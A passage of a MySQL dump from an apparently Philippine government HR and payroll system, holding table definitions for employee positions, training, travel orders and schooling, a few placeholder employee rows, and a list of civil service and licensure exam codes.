NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, '', '', '', '', NULL, NULL, NULL, NULL, NULL, NULL, '', '0000-00-00', '', NULL, '0000-00-00', '', '', '', '', '', '');


#
# TABLE STRUCTURE FOR: tblempposition
#

DROP TABLE IF EXISTS `tblempposition`;

CREATE TABLE `tblempposition` (
  `empNumber` varchar(30) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `appointmentCode` varchar(20) NOT NULL DEFAULT '',
  `statusOfAppointment` varchar(50) NOT NULL DEFAULT '',
  `positionCode` varchar(20) NOT NULL DEFAULT '',
  `serviceCode` varchar(20) NOT NULL DEFAULT '',
  `plantillaGroupCode` varchar(10) NOT NULL DEFAULT '',
  `divisionCode` varchar(20) NOT NULL DEFAULT '',
  `sectionCode` varchar(20) NOT NULL DEFAULT '',
  `taxStatCode` varchar(20) NOT NULL DEFAULT '',
  `itemNumber` varchar(50) NOT NULL DEFAULT '',
  `salaryGradeNumber` int(11) NOT NULL DEFAULT 0,
  `authorizeSalary` decimal(10,2) NOT NULL DEFAULT 0.00,
  `actualSalary` decimal(10,2) NOT NULL DEFAULT 0.00,
  `contractEndDate` date DEFAULT '0000-00-00',
  `effectiveDate` date NOT NULL DEFAULT '0000-00-00',
  `positionDate` date NOT NULL DEFAULT '0000-00-00',
  `longevityDate` date NOT NULL DEFAULT '0000-00-00',
  `longevityGap` decimal(4,2) DEFAULT 0.00,
  `firstDayAgency` date NOT NULL DEFAULT '0000-00-00',
  `firstDayGov` date NOT NULL DEFAULT '0000-00-00',
  `assignPlace` varchar(50) DEFAULT NULL,
  `stepNumber` int(11) NOT NULL DEFAULT 0,
  `dateIncremented` date NOT NULL DEFAULT '0000-00-00',
  `personnelAction` varchar(20) NOT NULL DEFAULT '',
  `employmentBasis` varchar(20) NOT NULL DEFAULT 'Fulltime',
  `categoryService` varchar(20) NOT NULL DEFAULT 'Career',
  `nature` varchar(20) NOT NULL DEFAULT 'Support',
  `hpFactor` decimal(2,0) NOT NULL DEFAULT 0,
  `longiFactor` decimal(2,0) DEFAULT 0,
  `payrollSwitch` char(1) NOT NULL DEFAULT 'N',
  `schemeCode` varchar(20) NOT NULL DEFAULT 'GEN',
  `itwSwitch` char(1) NOT NULL DEFAULT 'Y',
  `lifeRetSwitch` char(1) NOT NULL DEFAULT 'Y',
  `pagibigSwitch` char(1) NOT NULL DEFAULT 'Y',
  `philhealthSwitch` char(1) NOT NULL DEFAULT 'Y',
  `providentSwitch` char(1) NOT NULL DEFAULT '',
  `premiumAidSwitch` char(1) NOT NULL DEFAULT 'Y',
  `dtrSwitch` char(1) NOT NULL DEFAULT 'Y',
  `mcSwitch` char(1) NOT NULL DEFAULT 'Y',
  `hazardSwitch` char(1) NOT NULL DEFAULT 'Y',
  `longevitySwitch` char(1) NOT NULL DEFAULT 'Y',
  `PERASwitch` char(1) NOT NULL DEFAULT 'Y',
  `ADCOMSwitch` char(1) NOT NULL DEFAULT 'Y',
  `dependents` decimal(2,0) NOT NULL DEFAULT 0,
  `healthProvider` char(1) NOT NULL DEFAULT 'N',
  `tmpStepNumber` int(11) NOT NULL DEFAULT 0,
  `tmpActualSalary` decimal(10,2) NOT NULL DEFAULT 0.00,
  `tmpDateIncremented` date NOT NULL DEFAULT '0000-00-00',
  `tmpPositionDate` date NOT NULL DEFAULT '0000-00-00',
  `regularDedSwitch` char(1) NOT NULL DEFAULT '',
  `contriDedSwitch` char(1) NOT NULL DEFAULT '',
  `loanDedSwitch` char(1) NOT NULL DEFAULT '',
  `zonecode` varchar(20) NOT NULL DEFAULT '',
  `riceSwitch` char(1) NOT NULL DEFAULT '',
  `detailedfrom` char(1) NOT NULL DEFAULT '',
  `departmentcode` varchar(5) NOT NULL DEFAULT '',
  `groupCode` varchar(10) DEFAULT NULL,
  `firefighter` char(1) NOT NULL DEFAULT 'N',
  `security` char(1) NOT NULL DEFAULT 'N',
  `uniqueItemNumber` varchar(50) NOT NULL DEFAULT '',
  `physician` char(1) DEFAULT 'N',
  `officecode` varchar(20) NOT NULL DEFAULT '',
  `service` varchar(50) NOT NULL DEFAULT '',
  `payrollGroupCode` varchar(50) DEFAULT NULL,
  `taxAmount` decimal(10,2) DEFAULT 0.00,
  `hpTax` decimal(10,2) DEFAULT NULL,
  `lpTax` decimal(10,2) DEFAULT NULL,
  `laundrySwitch` char(1) NOT NULL DEFAULT 'Y',
  `addPAGIBIGContri` decimal(10,2) NOT NULL DEFAULT 0.00,
  `includeSecondment` int(11) NOT NULL DEFAULT 0,
  `group1` varchar(20) NOT NULL DEFAULT '',
  `group2` varchar(20) NOT NULL DEFAULT '',
  `group3` varchar(20) NOT NULL DEFAULT '',
  `group4` varchar(20) NOT NULL DEFAULT '',
  `group5` varchar(20) NOT NULL DEFAULT '',
  `RATACode` char(3) DEFAULT NULL,
  `RATAVehicle` char(1) DEFAULT NULL,
  `taxRate` int(11) DEFAULT NULL,
  `taxSwitch` char(1) NOT NULL,
  PRIMARY KEY (`empNumber`),
  KEY `AppointmentCode` (`appointmentCode`),
  KEY `DivisionCode` (`divisionCode`),
  KEY `Emp_No` (`empNumber`),
  KEY `PositionCode` (`positionCode`),
  KEY `SectionCode` (`sectionCode`),
  KEY `ServiceCode` (`serviceCode`),
  KEY `TaxStatusCode` (`taxStatCode`),
  KEY `idx_empNumber` (`empNumber`),
  FULLTEXT KEY `assignPlace` (`assignPlace`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `tblempposition` (`empNumber`, `appointmentCode`, `statusOfAppointment`, `positionCode`, `serviceCode`, `plantillaGroupCode`, `divisionCode`, `sectionCode`, `taxStatCode`, `itemNumber`, `salaryGradeNumber`, `authorizeSalary`, `actualSalary`, `contractEndDate`, `effectiveDate`, `positionDate`, `longevityDate`, `longevityGap`, `firstDayAgency`, `firstDayGov`, `assignPlace`, `stepNumber`, `dateIncremented`, `personnelAction`, `employmentBasis`, `categoryService`, `nature`, `hpFactor`, `longiFactor`, `payrollSwitch`, `schemeCode`, `itwSwitch`, `lifeRetSwitch`, `pagibigSwitch`, `philhealthSwitch`, `providentSwitch`, `premiumAidSwitch`, `dtrSwitch`, `mcSwitch`, `hazardSwitch`, `longevitySwitch`, `PERASwitch`, `ADCOMSwitch`, `dependents`, `healthProvider`, `tmpStepNumber`, `tmpActualSalary`, `tmpDateIncremented`, `tmpPositionDate`, `regularDedSwitch`, `contriDedSwitch`, `loanDedSwitch`, `zonecode`, `riceSwitch`, `detailedfrom`, `departmentcode`, `groupCode`, `firefighter`, `security`, `uniqueItemNumber`, `physician`, `officecode`, `service`, `payrollGroupCode`, `taxAmount`, `hpTax`, `lpTax`, `laundrySwitch`, `addPAGIBIGContri`, `includeSecondment`, `group1`, `group2`, `group3`, `group4`, `group5`, `RATACode`, `RATAVehicle`, `taxRate`, `taxSwitch`) VALUES ('1111', 'P', 'In-Service', '', '', '', '', '', '', '', '0', '0.00', '0.00', '0000-00-00', '0000-00-00', '0000-00-00', '0000-00-00', '0.00', '0000-00-00', '0000-00-00', NULL, '0', '0000-00-00', '', 'Fulltime', 'Career', 'Support', '0', '0', 'N', 'GEN', 'Y', 'Y', 'Y', 'Y', '', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', '0', 'N', '0', '0.00', '0000-00-00', '0000-00-00', '', '', '', '', '', '', '', NULL, 'N', 'N', '', 'N', '', '', NULL, '0.00', NULL, NULL, 'Y', '0.00', '0', '', '', '', '', '', NULL, NULL, NULL, '');
INSERT INTO `tblempposition` (`empNumber`, `appointmentCode`, `statusOfAppointment`, `positionCode`, `serviceCode`, `plantillaGroupCode`, `divisionCode`, `sectionCode`, `taxStatCode`, `itemNumber`, `salaryGradeNumber`, `authorizeSalary`, `actualSalary`, `contractEndDate`, `effectiveDate`, `positionDate`, `longevityDate`, `longevityGap`, `firstDayAgency`, `firstDayGov`, `assignPlace`, `stepNumber`, `dateIncremented`, `personnelAction`, `employmentBasis`, `categoryService`, `nature`, `hpFactor`, `longiFactor`, `payrollSwitch`, `schemeCode`, `itwSwitch`, `lifeRetSwitch`, `pagibigSwitch`, `philhealthSwitch`, `providentSwitch`, `premiumAidSwitch`, `dtrSwitch`, `mcSwitch`, `hazardSwitch`, `longevitySwitch`, `PERASwitch`, `ADCOMSwitch`, `dependents`, `healthProvider`, `tmpStepNumber`, `tmpActualSalary`, `tmpDateIncremented`, `tmpPositionDate`, `regularDedSwitch`, `contriDedSwitch`, `loanDedSwitch`, `zonecode`, `riceSwitch`, `detailedfrom`, `departmentcode`, `groupCode`, `firefighter`, `security`, `uniqueItemNumber`, `physician`, `officecode`, `service`, `payrollGroupCode`, `taxAmount`, `hpTax`, `lpTax`, `laundrySwitch`, `addPAGIBIGContri`, `includeSecondment`, `group1`, `group2`, `group3`, `group4`, `group5`, `RATACode`, `RATAVehicle`, `taxRate`, `taxSwitch`) VALUES ('REP0902', '', 'In-Service', '', '', '', '', '', '', '', '0', '0.00', '0.00', '0000-00-00', '0000-00-00', '0000-00-00', '0000-00-00', '0.00', '0000-00-00', '0000-00-00', NULL, '0', '0000-00-00', '', 'Fulltime', 'Career', 'Support', '0', '0', 'N', 'GEN', 'Y', 'Y', 'Y', 'Y', '', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', '0', 'N', '0', '0.00', '0000-00-00', '0000-00-00', '', '', '', '', '', '', '', NULL, 'N', 'N', '', 'N', '', '', NULL, '0.00', NULL, NULL, 'Y', '0.00', '0', '', '', '', '', '', NULL, NULL, NULL, '');
INSERT INTO `tblempposition` (`empNumber`, `appointmentCode`, `statusOfAppointment`, `positionCode`, `serviceCode`, `plantillaGroupCode`, `divisionCode`, `sectionCode`, `taxStatCode`, `itemNumber`, `salaryGradeNumber`, `authorizeSalary`, `actualSalary`, `contractEndDate`, `effectiveDate`, `positionDate`, `longevityDate`, `longevityGap`, `firstDayAgency`, `firstDayGov`, `assignPlace`, `stepNumber`, `dateIncremented`, `personnelAction`, `employmentBasis`, `categoryService`, `nature`, `hpFactor`, `longiFactor`, `payrollSwitch`, `schemeCode`, `itwSwitch`, `lifeRetSwitch`, `pagibigSwitch`, `philhealthSwitch`, `providentSwitch`, `premiumAidSwitch`, `dtrSwitch`, `mcSwitch`, `hazardSwitch`, `longevitySwitch`, `PERASwitch`, `ADCOMSwitch`, `dependents`, `healthProvider`, `tmpStepNumber`, `tmpActualSalary`, `tmpDateIncremented`, `tmpPositionDate`, `regularDedSwitch`, `contriDedSwitch`, `loanDedSwitch`, `zonecode`, `riceSwitch`, `detailedfrom`, `departmentcode`, `groupCode`, `firefighter`, `security`, `uniqueItemNumber`, `physician`, `officecode`, `service`, `payrollGroupCode`, `taxAmount`, `hpTax`, `lpTax`, `laundrySwitch`, `addPAGIBIGContri`, `includeSecondment`, `group1`, `group2`, `group3`, `group4`, `group5`, `RATACode`, `RATAVehicle`, `taxRate`, `taxSwitch`) VALUES ('ROCJ1010', 'CONT', 'In-Service', '', '', '', '', '', '', '', '11', '32400.00', '32400.00', '0000-00-00', '0000-00-00', '0000-00-00', '0000-00-00', '0.00', '0000-00-00', '0000-00-00', '', '0', '0000-00-00', '', 'FullTime', 'Career', 'Support', '0', '0', 'N', 'GEN', 'Y', 'Y', 'Y', 'Y', '', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', 'Y', '0', 'N', '0', '0.00', '0000-00-00', '0000-00-00', '', '', '', '', '', '', '', NULL, 'N', 'N', '', 'N', '', 'GOV', NULL, '0.00', NULL, NULL, 'Y', '0.00', '0', '', '', '', '', '', NULL, NULL, NULL, '');


#
# TABLE STRUCTURE FOR: tblempreference
#

DROP TABLE IF EXISTS `tblempreference`;

CREATE TABLE `tblempreference` (
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `refName` varchar(80) NOT NULL DEFAULT '',
  `refAddress` varchar(255) NOT NULL DEFAULT '',
  `refTelephone` varchar(20) DEFAULT NULL,
  `ReferenceIndex` int(11) NOT NULL AUTO_INCREMENT,
  PRIMARY KEY (`ReferenceIndex`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblemprequest
#

DROP TABLE IF EXISTS `tblemprequest`;

CREATE TABLE `tblemprequest` (
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `requestID` int(11) NOT NULL AUTO_INCREMENT,
  `requestCode` varchar(20) NOT NULL DEFAULT '',
  `requestDate` date NOT NULL DEFAULT '0000-00-00',
  `requestDetails` text DEFAULT NULL,
  `requestStatus` varchar(30) NOT NULL DEFAULT '',
  `statusDate` date DEFAULT '0000-00-00',
  `remarks` varchar(50) DEFAULT NULL,
  `signatory` varchar(50) NOT NULL DEFAULT '',
  `listDisplay` int(11) NOT NULL DEFAULT 1,
  `Signatory1` text NOT NULL,
  `Sig1DateTime` datetime NOT NULL,
  `Signatory2` text NOT NULL,
  `Sig2DateTime` datetime NOT NULL,
  `Signatory3` text NOT NULL,
  `Sig3DateTime` datetime NOT NULL,
  `SignatoryFin` text NOT NULL,
  `SigFinDateTime` datetime NOT NULL,
  `file_location` varchar(255) NOT NULL,
  PRIMARY KEY (`requestID`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblempscholarship
#

DROP TABLE IF EXISTS `tblempscholarship`;

CREATE TABLE `tblempscholarship` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `empSchoolCode` int(11) NOT NULL DEFAULT 0,
  `empNumber` varchar(20) NOT NULL DEFAULT '',
  `ScholarshipCode` varchar(50) NOT NULL DEFAULT '',
  PRIMARY KEY (`id`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblempschool
#

DROP TABLE IF EXISTS `tblempschool`;

CREATE TABLE `tblempschool` (
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `levelCode` varchar(20) NOT NULL DEFAULT '',
  `schoolName` varchar(80) NOT NULL DEFAULT '',
  `course` varchar(50) NOT NULL DEFAULT '',
  `yearGraduated` varchar(4) DEFAULT '',
  `units` varchar(15) DEFAULT NULL,
  `schoolFromDate` varchar(4) NOT NULL DEFAULT '0000',
  `schoolToDate` varchar(4) NOT NULL DEFAULT '0000',
  `ScholarshipCode` varchar(50) NOT NULL,
  `honors` text DEFAULT NULL,
  `courseCode` varchar(10) NOT NULL DEFAULT '',
  `SchoolIndex` int(11) NOT NULL AUTO_INCREMENT,
  `licensed` char(1) NOT NULL DEFAULT '',
  `graduated` char(1) NOT NULL DEFAULT 'Y',
  PRIMARY KEY (`SchoolIndex`),
  KEY `SchoolType` (`levelCode`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblemptraining
#

DROP TABLE IF EXISTS `tblemptraining`;

CREATE TABLE `tblemptraining` (
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `XtrainingCode` varchar(10) NOT NULL DEFAULT '',
  `trainingTitle` text NOT NULL,
  `trainingContractDate` date DEFAULT '0000-00-00',
  `trainingStartDate` date NOT NULL DEFAULT '0000-00-00',
  `trainingEndDate` date NOT NULL DEFAULT '0000-00-00',
  `trainingHours` decimal(5,2) NOT NULL DEFAULT 0.00,
  `trainingTypeofLD` varchar(100) NOT NULL,
  `trainingConductedBy` varchar(100) NOT NULL DEFAULT '',
  `trainingVenue` varchar(100) NOT NULL DEFAULT '',
  `trainingCost` decimal(10,2) NOT NULL DEFAULT 0.00,
  `trainingDesc` varchar(200) NOT NULL DEFAULT '',
  `TrainingIndex` int(11) NOT NULL AUTO_INCREMENT,
  PRIMARY KEY (`TrainingIndex`),
  KEY `Emp_No` (`empNumber`),
  KEY `TrainingID` (`XtrainingCode`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblemptravelorder
#

DROP TABLE IF EXISTS `tblemptravelorder`;

CREATE TABLE `tblemptravelorder` (
  `toID` int(11) NOT NULL AUTO_INCREMENT,
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `dateFiled` date NOT NULL DEFAULT '0000-00-00',
  `toDateFrom` date NOT NULL DEFAULT '0000-00-00',
  `toDateTo` date NOT NULL DEFAULT '0000-00-00',
  `destination` text NOT NULL,
  `purpose` text NOT NULL,
  `fund` varchar(30) NOT NULL DEFAULT '',
  `transportation` varchar(30) NOT NULL DEFAULT '',
  `perdiem` char(1) NOT NULL DEFAULT '',
  `wmeal` char(1) NOT NULL,
  PRIMARY KEY (`toID`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblemptripticket
#

DROP TABLE IF EXISTS `tblemptripticket`;

CREATE TABLE `tblemptripticket` (
  `ttID` int(11) NOT NULL AUTO_INCREMENT,
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `dateFiled` date NOT NULL DEFAULT '0000-00-00',
  `destination` text NOT NULL,
  `purpose` text NOT NULL,
  `ttDateFrom` date NOT NULL DEFAULT '0000-00-00',
  `ttDateTo` date NOT NULL DEFAULT '0000-00-00',
  `perdiem` char(1) NOT NULL DEFAULT '',
  PRIMARY KEY (`ttID`)
) ENGINE=MyISAM AUTO_INCREMENT=2 DEFAULT CHARSET=latin1;

INSERT INTO `tblemptripticket` (`ttID`, `empNumber`, `dateFiled`, `destination`, `purpose`, `ttDateFrom`, `ttDateTo`, `perdiem`) VALUES ('1', '. 0011-CO0-2009', '2009-05-14', 'test', 'test', '2009-05-04', '2009-05-04', 'N');


#
# TABLE STRUCTURE FOR: tblempvoluntarywork
#

DROP TABLE IF EXISTS `tblempvoluntarywork`;

CREATE TABLE `tblempvoluntarywork` (
  `empNumber` varchar(20) CHARACTER SET latin1 COLLATE latin1_bin NOT NULL DEFAULT '',
  `vwName` varchar(50) DEFAULT NULL,
  `vwAddress` text DEFAULT NULL,
  `vwDateFrom` date DEFAULT '0000-00-00',
  `vwDateTo` date DEFAULT '0000-00-00',
  `vwHours` decimal(4,2) DEFAULT 0.00,
  `vwPosition` varchar(50) DEFAULT NULL,
  `VoluntaryIndex` int(11) NOT NULL AUTO_INCREMENT,
  PRIMARY KEY (`VoluntaryIndex`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tbleventsatt
#

DROP TABLE IF EXISTS `tbleventsatt`;

CREATE TABLE `tbleventsatt` (
  `evt_id` int(11) NOT NULL AUTO_INCREMENT,
  `evt_por_id` int(11) NOT NULL,
  `empNumber` varchar(20) NOT NULL,
  `evt_date` datetime NOT NULL,
  `evt_by` varchar(20) NOT NULL,
  PRIMARY KEY (`evt_id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

#
# TABLE STRUCTURE FOR: tblexamtype
#

DROP TABLE IF EXISTS `tblexamtype`;

CREATE TABLE `tblexamtype` (
  `examCode` varchar(20) NOT NULL DEFAULT '',
  `examDesc` varchar(50) NOT NULL DEFAULT '',
  `csElligible` char(1) NOT NULL DEFAULT 'N',
  PRIMARY KEY (`examCode`)
) ENGINE=MyISAM DEFAULT CHARSET=latin1;

INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('RA1080', 'Philippine Bar Examination', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('O', 'Others', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('CATIII', 'Performance based', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('TBE', 'Teachers Board Exam', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('CESO1', 'Career Executive Service Officer 1', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('PRC-ChE', 'PRC Chemical Engineering Board', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('CSC-DE', 'CSC Data Encoder', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('MCP', 'Microsoft Certified Professional', 'N');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('MCDST', 'Microsoft Certified Desktop Support Technician', 'N');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('CES', 'Career Executive Service Eligibility', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('PRC-Geo', 'Geologist Licensure Examination', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('CESO5', 'Career Executive Service Officer 5', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('CESO4', 'Career Executive Service Officer 4', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('SROC', 'Special Radiotelephone Operator Certificate', 'N');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('CPA-BE', 'CPA Board Exam', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('MTBE', 'Medical Technology Board Exams', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('GCE', 'General Clerical Examinatiion', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('NBE', 'Nutritionist Board Exam', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('AGSERP', 'Agri Office Exam', 'N');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('AMO', 'Accounting Machine Operator', 'N');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('BEN', 'Nursing Licensure Exam', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('CEBE', 'Chemical Engineering Board', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('CSP', 'Career Service Professional', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('FBS', 'Forester Board Exam', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('Cpa', 'Certified Public Accountant', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('SAP', 'Stenograph exam', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('CEB', 'Civil Engineering Board Examination', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('ACD', 'Chemist Board Examination', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('OCD', 'General Clerical Examination', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('DAE', 'Profesional Examinations', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('UOP', 'PD 997', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('ER', 'CESO 1', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('NLE', 'Nursing Licensure Examinations', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('NCIII', 'NCIII Bookkeping', 'N');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('OP', 'Nutritionists and Dietitians Licensure Examination', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('IO', 'Medical Technology Board Exams', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('ABE', 'Agriculture Board Examination', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('OS', 'Career Executive Service Officer 2', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('DA', 'Career Executive Service Eligable', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('CO', 'Management Analysis', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('CS', 'First Grade Civil Service Entrance', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('TTA', 'Testimonial test for Automotive', 'N');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('BOE', 'Barangay Official Eligibility', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('CSE-1', 'First Grade Civil Service Exam', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('CSE-2', 'Second Grade Civil Service Exam', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('CRE2', 'CESO Rank II', 'N');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('CA', 'Certified Public Accountant licensure exam', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('SE', 'Profesore', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('SW', 'Career Service Eligibility', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('DS', 'CPA Board Exam', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('CSEB', 'Career Executive Service Board', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('PD907', 'Presidential Decree 907 (Honor Graduate)', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('MEB', 'Mechanical Engineering Board Exam', '');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('CSC-S', 'CSC Local Scholarship Qualifying Exam', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('AElecEng', 'Assistant Electrical Engineering Licensure Exam', '');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('RANo1080', 'RA No 1080', '');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('CSCTTO', 'CSC Testimonial Telephone Operator', '');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('CSC-LOC', 'Career Service Professional Exam for Local Govt', '');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('CSSP', 'Career Service Subprofessional', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('AEEng', 'Associate Electrical Engineer', '');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('EEBE', 'Electronics Engineering Board Exam', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('EBE', 'Electrical Engineering Board Exam', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('CESO', 'Career Executive Service Officer', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('PBET', 'Professional Board Exam for Teachers', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('CATI', 'Skills based', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('CATII', 'License', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('GROC', 'Government Radio Operator Certificate', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('ME', 'Mechanical Engineering Licensure Exam', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('LET', 'Licensure Examination for Teachers (LET)', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('CSCProf', 'Career Service Professional', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('PAE', 'Professional Agricultural Engineer', '');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('MPLE', 'Master Plumbers Licensure Exam', '');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('MELE', 'Master Electrician Licensure Exam', '');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('HGE', 'Honor Graduate Eligibility', '');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('CESO3', 'Career Executive Service Officer 3', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('ALE', 'Agricultural Licensure Examination', '');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('SEBE', 'Sanitary Engineering Board Exam', 'Y');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('ChemLicExam', 'Chemistry Licensure Examination', '');
INSERT INTO `tblexamtype` (`examCode`, `examDesc`, `csElligible`) VALUES ('ElecTechLic', 'Electronics Technician Licensure Examination', 'N');
